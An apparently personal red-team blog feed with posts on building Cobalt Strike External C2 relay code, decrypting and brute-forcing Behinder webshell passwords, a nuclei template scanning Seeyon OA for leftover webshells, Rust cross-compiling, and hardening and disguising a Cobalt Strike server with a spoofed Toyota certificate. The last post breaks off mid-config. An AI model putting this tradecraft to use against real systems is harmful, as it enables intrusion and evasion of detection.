<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hi, I&#39;m Arm!tage.</title>
  
  
  <link href="https://arrnitage.github.io/atom.xml" rel="self"/>
  
  <link href="https://arrnitage.github.io/"/>
  <updated>2023-02-08T12:21:36.503Z</updated>
  <id>https://arrnitage.github.io/</id>
  
  <author>
    <name>Arm!tage</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>External C2</title>
    <link href="https://arrnitage.github.io/External-C2/"/>
    <id>https://arrnitage.github.io/External-C2/</id>
    <published>2023-02-08T12:21:36.000Z</published>
    <updated>2023-02-08T12:21:36.503Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>Cobalt Strike TeamServer</code> - <em><strong>TCP</strong></em> -&gt; <code>External C2 Server</code> - <em><strong>Custom Protocol</strong></em> -&gt; <code>External C2 Client</code> - <em><strong>SMB Share</strong></em> -&gt; <code>SMB Beacon</code></p><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><h3 id="启动External-C2-Listen"><a href="#启动External-C2-Listen" class="headerlink" title="启动External C2 Listen"></a>启动External C2 Listen</h3><p><img src="/External-C2/1675826811709.png" alt="1675826811709"></p><h3 id="Server与Client代码逻辑"><a href="#Server与Client代码逻辑" class="headerlink" title="Server与Client代码逻辑"></a>Server与Client代码逻辑</h3><p>Server功能如下：</p><ol><li>通过External C2 协议与TeamServer交换数据。</li><li>通过自定义协议与Client交换数据。</li></ol><p>Client功能如下：</p><ol><li>通过SMB协议与Beacon交换数据。</li><li>通过自定义协议与Server交换数据。</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>把代码分成4部分</p><ul><li>Server与ExternalC2数据交换实现</li><li>自定义协议在Server上的实现</li><li>自定义协议在Client上的实现</li><li>Client与SMB Beacon数据交换实现</li></ul><h3 id="Server-lt-gt-ExternalC2-Listener"><a href="#Server-lt-gt-ExternalC2-Listener" class="headerlink" title="Server &lt;-&gt; ExternalC2 Listener"></a>Server &lt;-&gt; ExternalC2 Listener</h3><blockquote><p>以下代码节选自<a href="https://gist.github.com/xpn/bb82f2ca4c8e9866c12c54baeb64d771">xpn</a></p></blockquote><p>通过<code>sendToTS()</code>发送配置项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Now we have a beacon connection, we kick off comms with CS External C2</span></span><br><span class="line">self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">self._socketTS.connect((<span class="string">&quot;127.0.0.1&quot;</span>, self.port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send out config options</span></span><br><span class="line">self.sendToTS(<span class="string">&quot;arch=x86&quot;</span>)</span><br><span class="line">self.sendToTS(<span class="string">&quot;pipename=xpntest&quot;</span>)</span><br><span class="line">self.sendToTS(<span class="string">&quot;block=500&quot;</span>)</span><br><span class="line">self.sendToTS(<span class="string">&quot;go&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Receive the beacon payload from CS to forward to our custom beacon</span></span><br><span class="line">data = self.recvFromTS()</span><br></pre></td></tr></table></figure><h3 id="Client-lt-gt-SMB-Beacon"><a href="#Client-lt-gt-SMB-Beacon" class="headerlink" title="Client &lt;-&gt; SMB Beacon"></a>Client &lt;-&gt; SMB Beacon</h3><blockquote><p>以下代码节选自<a href="https://gist.github.com/xpn/08cf7001780020bb60c5c773cec5f839">xpn</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">connectBeaconPipe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pipeName)</span> &#123;</span><br><span class="line">HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our injected beacon via a named pipe</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">recvFromBeacon</span><span class="params">(HANDLE pipe, DWORD *len)</span> &#123;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line">DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ReadFile(pipe, len, <span class="number">4</span>, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(*len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">totalLen += bytesRead;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write data to our injected beacon via a named pipe</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sendToBeacon</span><span class="params">(HANDLE pipe, <span class="type">const</span> <span class="type">char</span> *data, DWORD len)</span> &#123;</span><br><span class="line">DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">WriteFile(pipe, &amp;len, <span class="number">4</span>, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">WriteFile(pipe, data, len, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="未实现的想法"><a href="#未实现的想法" class="headerlink" title="未实现的想法"></a>未实现的想法</h2><p>或许通过这种方法可以仿照构造出其他的C2隧道，比如用MySQL、redis或者其他的云服务作为通信隧道以对抗流量检查。但个人觉得使用这种方法或许缺乏反溯源能力，毕竟要同时连接到一个公共的数据库服务上，且登录密钥是保存在Client中，很难不被分析出来，并通过查询数据库连接记录溯源到C2。或许能够通过配置数据库不记录连接记录进行对抗，但终究不是好办法。</p><p>如果代码能力强的话或许可以实现像APT组织一样使用Weibo、github等公共消息平台进行数据传递。</p><h2 id="其他高级利用姿势"><a href="#其他高级利用姿势" class="headerlink" title="其他高级利用姿势"></a>其他高级利用姿势</h2><ul><li><a href="https://xz.aliyun.com/t/6565">结合WebShell正向上线</a></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://download.cobaltstrike.com/downloads/externalc2spec.pdf">官方手册</a></li><li><a href="https://gist.github.com/xpn/bb82f2ca4c8e9866c12c54baeb64d771">xpn-server</a></li><li><a href="https://gist.github.com/xpn/08cf7001780020bb60c5c773cec5f839">xpn-client</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Cobalt Strike TeamServer&lt;/code&gt; - &lt;em&gt;&lt;strong&gt;TCP&lt;/strong&gt;&lt;/em&gt; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Behinder3 Protocol</title>
    <link href="https://arrnitage.github.io/Behinder3-Protocol/"/>
    <id>https://arrnitage.github.io/Behinder3-Protocol/</id>
    <published>2023-02-02T09:20:28.000Z</published>
    <updated>2023-02-02T09:24:21.466Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前写了一个扫描seeyon后门的nuclei template， 可以用来扫描一些Behinder、Godzilla、Cmdexec的websehll，但是还不能确定这些后门能不能用，所以这次就分析常见的Behinder3.0.11版本的流量。</p></blockquote><h2 id="Behinder-流量分析"><a href="#Behinder-流量分析" class="headerlink" title="Behinder 流量分析"></a>Behinder 流量分析</h2><h3 id="部署WebShell"><a href="#部署WebShell" class="headerlink" title="部署WebShell"></a>部署WebShell</h3><p>环境部署直接使用Vulhub中tomcat&#x2F;tomcat8的docker镜像，通过部署WAR包在本地创建一个jsp的WebShell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>为了了解Behinder过程，还需要对Behinder的jar包进行调试。</p><h3 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h3><ol><li><p>首先使用idea创建一个项目，导入<strong>behinder.jar</strong></p><p><img src="/Behinder3-Protocol/1675243132483.png" alt="1675243132483"></p></li><li><p>配置远程调试</p><p><img src="/Behinder3-Protocol/1675243199396.png" alt="1675243199396"></p></li><li><p>用远程调试的方式启动behinder.jar</p><ul><li><code>java8 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar Behinder.jar</code></li></ul></li></ol><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><ol><li><p>先抓取请求响应流量。双击打开一个WebShell后会发送两个请求，下文中分别称为 <code>Req-1</code>与 <code>Req-2</code>，其响应也称为 <code>Resp-1</code>与 <code>Resp-2</code>。</p><p><img src="/Behinder3-Protocol/1675243753228.png" alt="1675243753228"><br><img src="/Behinder3-Protocol/1675243803250.png" alt="1675243803250"></p></li><li><p>在 <code>net.rebeyond.behinder.core.Shell.Service#doConnect</code>方法中，先生成一个3000以内随机长度的随机字符串，并传给 <code>echo</code>方法。</p><p><img src="/Behinder3-Protocol/1675245037858.png" alt="1675245037858"></p></li><li><p>跟进 <code>net.rebeyond.behinder.core.ShellServeice#echo</code>方法。调用 <code>net.rebeyond.behinder.utils.Utils#getData</code>方法对 <code>Echo</code>类进行加密，之后调用 <code>net.rebeyond.behinder.utils.Utils#requestAndParse</code>方法发送请求。并从响应中获取Cookie用作后续请求时加入到Cookie中。</p><p><img src="/Behinder3-Protocol/1675244588387.png" alt="1675244588387"></p></li><li><p>跟进 <code>net.rebeyond.behinder.utils.Utils#getData</code>方法，大致内容是对 <code>Echo</code>的class进行AES加密。</p><p><img src="/Behinder3-Protocol/1675246190179.png" alt="1675246190179"></p></li><li><p>在本地使用之前生成的随机字符串构造一个JSON字符串，并使用AES加密。将加密后的结果与 <code>Resp-1</code>进行比较，计算出执行结果的插入偏移。</p><p><img src="/Behinder3-Protocol/1675246034986.png" alt="1675246034986"></p></li><li><p>对执行结果密文进行AES解密，</p><p><img src="/Behinder3-Protocol/1675245957497.png" alt="1675245957497"></p></li></ol><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>根据对源代码执行流程分析，现在可以对 <code>Req-1</code>的请求内容进行解密。可以看到右下角的解密内容看起来非常像是一个class文件，上面一串随机字符猜测也是生成的随机字符串。</p><p><img src="/Behinder3-Protocol/1675246438739.png" alt="1675246438739"></p><p>在<strong>CyberChef</strong>中构造本地的JSON字符串，并使用AES加密，与 <code>RESP-1</code>中的内容进行比较</p><h2 id="密码暴力破解"><a href="#密码暴力破解" class="headerlink" title="密码暴力破解"></a>密码暴力破解</h2><p>有了以上的分析，密码暴力破解的方法也就出来了。我们可以先对一个请求进行解密，拿到bytes数据，并使用字典中的密码进行加密。发送请求去分析响应体中的内容是否满足。经过过个不同站点测试，发现只要发送相同的请求内容，则会返回相同长度的响应。根据这个特点编写密码暴力破解的脚本。</p><p>项目地址：<a href="https://github.com/Arrnitage/BehinderBrute">BehinderBrute</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;之前写了一个扫描seeyon后门的nuclei template， 可以用来扫描一些Behinder、Godzilla、Cmdexec的websehll，但是还不能确定这些后门能不能用，所以这次就分析常见的Behinder3.0.11版本的流量。&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Rust Cross Compile</title>
    <link href="https://arrnitage.github.io/Rust-Cross-Compile/"/>
    <id>https://arrnitage.github.io/Rust-Cross-Compile/</id>
    <published>2023-01-06T02:22:39.000Z</published>
    <updated>2023-01-06T02:22:39.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="交叉编译Linux平台程序"><a href="#交叉编译Linux平台程序" class="headerlink" title="交叉编译Linux平台程序"></a>交叉编译Linux平台程序</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul><li><code>rustup target add x86_64-unknown-linux-musl</code> - 安装工具链</li><li><code>brew install filosottile/musl-cross/musl-cross</code></li></ul><h3 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo build -—release -—target x86_64-unknown-linux-musl</span><br></pre></td></tr></table></figure><h2 id="交叉编译Windows平台程序"><a href="#交叉编译Windows平台程序" class="headerlink" title="交叉编译Windows平台程序"></a>交叉编译Windows平台程序</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><ul><li><code>rustup target add x86_64-pc-windows-gnu</code></li><li><code>brew install mingw-w64</code></li></ul><h3 id="编译程序-1"><a href="#编译程序-1" class="headerlink" title="编译程序"></a>编译程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo build --release --target x86_64-pc-windows-gnu</span><br></pre></td></tr></table></figure><h2 id="工具链配置"><a href="#工具链配置" class="headerlink" title="工具链配置"></a>工具链配置</h2><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在项目目录下.cargo/config 或 ～/.cargo/config 中配置如下内容</span></span><br><span class="line"><span class="section">[target.x86_64-unknown-linux-musl]</span></span><br><span class="line"><span class="attr">linker</span> = <span class="string">&quot;x86_64-linux-musl-gcc&quot;</span></span><br><span class="line"><span class="section">[target.x86_64-pc-windows-gnu]</span></span><br><span class="line"><span class="attr">linker</span> = <span class="string">&quot;x86_64-w64-mingw32-gcc&quot;</span></span><br><span class="line"><span class="attr">ar</span> = <span class="string">&quot;x86_64-w64-mingw32-gcc-ar&quot;</span></span><br></pre></td></tr></table></figure><h2 id="通过LTO缩减程序体积"><a href="#通过LTO缩减程序体积" class="headerlink" title="通过LTO缩减程序体积"></a>通过LTO缩减程序体积</h2><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Cargo.toml 中添加如下配置</span></span><br><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">opt-level</span> = <span class="string">&quot;z&quot;</span>     <span class="comment"># Optimize for size.</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">true</span>         <span class="comment"># Enable Link Time Optimization</span></span><br><span class="line"><span class="attr">codegen-units</span> = <span class="number">1</span>   <span class="comment"># Reduce number of codegen units to increase optimizations.</span></span><br><span class="line"><span class="attr">panic</span> = <span class="string">&quot;abort&quot;</span>     <span class="comment"># Abort on panic</span></span><br><span class="line"><span class="attr">strip</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment"># or strip = &quot;symbols&quot;   # Strip symbols from binary</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.cnblogs.com/007sx/p/15191400.html">Rust交叉编译Mac编译Linux&#x2F;Windows平台</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;交叉编译Linux平台程序&quot;&gt;&lt;a href=&quot;#交叉编译Linux平台程序&quot; class=&quot;headerlink&quot; title=&quot;交叉编译Linux平台程序&quot;&gt;&lt;/a&gt;交叉编译Linux平台程序&lt;/h2&gt;&lt;h3 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>利用常见致远OA后门进行打点</title>
    <link href="https://arrnitage.github.io/%E5%88%A9%E7%94%A8%E5%B8%B8%E8%A7%81%E8%87%B4%E8%BF%9COA%E5%90%8E%E9%97%A8%E8%BF%9B%E8%A1%8C%E6%89%93%E7%82%B9/"/>
    <id>https://arrnitage.github.io/%E5%88%A9%E7%94%A8%E5%B8%B8%E8%A7%81%E8%87%B4%E8%BF%9COA%E5%90%8E%E9%97%A8%E8%BF%9B%E8%A1%8C%E6%89%93%E7%82%B9/</id>
    <published>2022-12-08T10:18:07.000Z</published>
    <updated>2023-01-06T02:02:38.588Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在各种攻防演练中，致远OA通常会成为进入内网的突破口。在我利用漏洞获取webshell的大多数致远OA中，通常在web目录下已经包含了多个websehll。这些webshell一般都是由网络上的扫描器进行漏洞测试遗留下来的。我将其中经常出现的webshell名称收集起来，编写了如下nuclei template，将该template加入扫描队列中，可方便的检测致远OA以前是否被入侵过。</p></blockquote><h2 id="编写后门扫描程序"><a href="#编写后门扫描程序" class="headerlink" title="编写后门扫描程序"></a>编写后门扫描程序</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">Seeyon-OA-Backdoor</span></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Seeyon</span> <span class="string">OA</span> <span class="string">behinder</span> <span class="string">webshell</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">Armitage</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">reference:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">Seeyon,backdoor,webshell</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/<span class="template-variable">&#123;&#123;path&#125;&#125;</span>/<span class="template-variable">&#123;&#123;webshell&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">payloads:</span></span><br><span class="line">      <span class="attr">path:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">seeyon</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">seeyon/common/designer/pageLayout</span></span><br><span class="line">      <span class="attr">webshell:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SeeyonUpdate1.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">PeiQi.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">test.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SeeyonUpdate.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">edictor.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">update.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">seeyonupdate.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">test233.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">404.</span><span class="string">jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">peiqi10086.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">test10086.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">test133.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">abab.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">core.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">a.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">seeyonupdate.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">seeyon.jspx</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">loveyou.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">justfortest1.jsp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">sp1.jsp</span></span><br><span class="line">    <span class="attr">attack:</span> <span class="string">clusterbomb</span></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><h2 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h2><p>这个template在高烈度攻防对抗中不是很起作用。但对于一些下属单位的OA可能会起到作用。还有一个问题就是这些webshell中有命令执行的，有冰蝎的，无法准确判断webshell类型。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在各种攻防演练中，致远OA通常会成为进入内网的突破口。在我利用漏洞获取webshell的大多数致远OA中，通常在web目录下已经包含了多个websehll。这些webshell一般都是由网络上的扫描器进行漏洞测试遗留下来的。我将其中经常出现的web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>如何部署CobaltStrike</title>
    <link href="https://arrnitage.github.io/%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2CobaltStrike/"/>
    <id>https://arrnitage.github.io/%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2CobaltStrike/</id>
    <published>2022-09-20T06:13:08.000Z</published>
    <updated>2022-09-20T06:13:08.249Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CobaltStrike已经是Red Team中使用最广泛的远控程序，但是CobaltStrike中也存在一些问题，部分比较严重的问题只能通过修改代码进行修补，而有些问题可以通过更改部署方式实现修补</p></blockquote><h2 id="CobaltStrike-Intro"><a href="#CobaltStrike-Intro" class="headerlink" title="CobaltStrike Intro"></a>CobaltStrike Intro</h2><p>beacon –&gt; TeamServer –&gt; Controller</p><p>TeamServer默认使用50050端口作为管理端口，我将该作用端口称为TeamServer。用作接收beacon请求的端口，我称之为listener。<del>另外CobaltStrike在使用过程中可能还会使用到由red team operator 指定的socks4a服务端口</del>(狗都不用)。</p><h2 id="TeamServer-存在的问题-amp-如何规避"><a href="#TeamServer-存在的问题-amp-如何规避" class="headerlink" title="TeamServer 存在的问题 &amp; 如何规避"></a>TeamServer 存在的问题 &amp; 如何规避</h2><p>在TeamServer上目前存在如下问题：</p><ol><li>默认端口</li><li>证书指纹</li></ol><p>TeamServer上存在的问题比较好解决，通过修改端口号与更换证书即可。</p><h3 id="修改端口号"><a href="#修改端口号" class="headerlink" title="修改端口号"></a>修改端口号</h3><p>查看 <code>teamserver</code>文件最后，我们可以看到启动命令中有指定端口的配置参数 <code>-Dcobaltstrike.server_port=50050</code>，通过修改参数，即可修改端口号。</p><h3 id="更换证书"><a href="#更换证书" class="headerlink" title="更换证书"></a>更换证书</h3><p>在 <code>teamserver</code>文件中，如果路径下缺少 <code>cobaltstrike.store</code>文件，则会按照设定内容创建一个cobaltstrike固定证书。我们可以通过修改脚本文件内容并删除已经创建的 <code>cobaltstrike.store</code>文件让脚本自动创建。也可以自己通过 <code>keytool</code>命令创建一个证书文件并命名为 <code>cobaltstrike.store</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建证书</span></span><br><span class="line">keytool -keystore cobaltstrike.store -storepass armitageIsBest -genkey -keyalg RSA -<span class="built_in">alias</span> toyota.jp -dname <span class="string">&quot;CN=toyota.jp, OU=e-TOYOTA DIV, O=TOYOTA MOTOR CORPORATION, L=Toyota-Shi, S=Aichi, C=JP&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看证书</span></span><br><span class="line">keytool -list -v keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><h3 id="通过代理隧道连接TeamServer"><a href="#通过代理隧道连接TeamServer" class="headerlink" title="通过代理隧道连接TeamServer"></a>通过代理隧道连接TeamServer</h3><p>在防火墙上直接关闭50050的外部连接，然后通过ssh隧道或其他代理隧道访问50050</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw deny 50050</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立SSH代理隧道</span></span><br><span class="line">ssh -i id_rsa -N -D 127.0.0.1:50500 root@XXX.XXX.XXX.XXX</span><br></pre></td></tr></table></figure><p>使用proxifer或proxychains给cobaltstrike配置代理访问TeamServer</p><h2 id="Listener-存在的问题-amp-如何规避"><a href="#Listener-存在的问题-amp-如何规避" class="headerlink" title="Listener 存在的问题 &amp; 如何规避"></a>Listener 存在的问题 &amp; 如何规避</h2><ol><li>请求流量</li><li>checksum8指纹</li><li>特殊请求地址下载stager</li></ol><h3 id="修改流量特征"><a href="#修改流量特征" class="headerlink" title="修改流量特征"></a>修改流量特征</h3><p>通过配置profile中的<code>http-get</code>与<code>http-post</code>可以直接修改C2通信过程中的流量内容。<br>使用几个工具可以快速生成你想要的流量</p><ol><li><a href="https://github.com/Peithon/JustC2file">JustC2file</a></li><li><a href="https://github.com/threatexpress/random_c2_profile">random_c2_profile</a></li><li><a href="https://github.com/CodeXTF2/Burp2Malleable">Burp2Malleable</a></li></ol><h3 id="Caddy重定向器"><a href="#Caddy重定向器" class="headerlink" title="Caddy重定向器"></a>Caddy重定向器</h3><h4 id="限制listener外部直接访问"><a href="#限制listener外部直接访问" class="headerlink" title="限制listener外部直接访问"></a>限制listener外部直接访问</h4><p>创建http协议与https协议listener分别在33080或33443端口上，通过防火墙限制两个端口的访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw deny 33080</span><br><span class="line">sudo ufw deny 33443</span><br></pre></td></tr></table></figure><h4 id="配置profile"><a href="#配置profile" class="headerlink" title="配置profile"></a>配置profile</h4><p>在 <code>http-config</code>块中添加选项 <code>set trust_x_forwarded_for “true”;</code></p><h4 id="Caddyfile"><a href="#Caddyfile" class="headerlink" title="Caddyfile"></a>Caddyfile</h4><p>使用caddy反向代理功能(Nginx和Apache都可以实现)，将80与443端口分别代理到33080与33443端口上。这样就可以caddy转发访问到listener。<br>实际配置过程中不要配置<code>/*</code>，这样配置无法做到滤除checksum8指纹与stager请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 